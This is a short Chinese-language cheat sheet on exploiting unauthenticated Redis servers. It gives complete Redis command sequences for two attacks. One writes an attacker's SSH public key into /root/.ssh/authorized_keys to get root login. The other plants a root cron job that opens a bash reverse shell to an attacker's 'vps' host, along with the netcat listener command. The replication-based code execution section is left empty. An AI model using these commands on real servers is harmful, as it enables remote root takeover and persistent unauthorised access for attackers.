# Redis未授权利用总结

- Windows下，绝对路径写webshell 、写入启动项。

- Linux下，绝对路径写webshell 、公私钥认证获取root权限 、利用contrab计划任务反弹shell。

  

## 写入公钥匙

### 写入文件

```bash
ssh-keygen -t rsa #生成密钥对
./redis-cli -h 192.168.0.1 #登录服务器 或telnet也可
set ooxx "\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4tvzpcxSRxx51aVBLeetsu6J/OsDJTyQGt5LcLtbQDHzctGLTVzaXQ+NXRPnGXmLzIZP8/dn7SeEKGhPJmruByUEmJkhBln/Flgp1CUDtX/RJ7q/YkFTHdHYyq1zVG75y2/VpMfEMwP87UD7teZjbSKKeuD1SFfrXbwIqZruiRuOHXSNilsm3wINj8ZwhnxRo7IFBXSwtGA4TqCno1ngaDTzwHT+PKLIGt2n/5V2S7R/+EYneBiLAhQJ0b9GmW35RRZGsoWYKGSmytmPjd81GpEojjynKu4jsB/6F+IU9aH45KYzOF44yOZOwodj7mVIHtdL7kTE5y2rzaNNZH32qw7wM35WaiLjvHsqt9GAcLs88OMy9PSFb/41IrQEDdldxjzKCfAOKku6X0s3V1MfZPSy+foIcEy1sgfFm52nWaogNuBim1sYkq9lipwN88NhrvJH43afYv8/qe3ik+rKumAh3OqgUv4jNFMjBjpqUp+XUyIFjBouIUy/ORIUXm5E= root@b17ed2775c27\n\n\n" #写入缓存
get ooxx #查看缓存
config set dir /root/.ssh　　　　　　//切换路径 设置存储公钥路径
config set dbfilename authorized_keys　　//设置文件名称
save
```

### 测试连接

```bash
ssh -i /root/.ssh/id_isa 192.168.0.1
```



## 计划任务

### 写入任务

```bash
./redis-cli -h 192.168.0.1 #登录服务器
config set dir /var/spool/cron
config set dbfilename root
set xxx "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/vps/vps_port 0>&1\n\n"
save
```

### 测试连接

```
nc -lvp vps_port
```



## 主从复制命令执行

### msf

略

